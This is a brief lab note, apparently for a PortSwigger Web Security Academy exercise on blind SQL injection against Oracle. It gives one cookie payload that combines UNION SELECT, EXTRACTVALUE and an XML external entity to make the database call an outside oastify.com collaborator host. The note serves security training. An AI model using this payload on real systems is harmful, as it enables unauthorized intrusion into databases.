---
title: "16 - Blind SQL injection with out-of-band interaction"
---

# 16 - Blind SQL injection with out-of-band interaction

Oracle

https://portswigger.net/web-security/sql-injection/cheat-sheet

```R
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//bixkdbjkewy7v26t6d9ep4em9df73zunj.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```
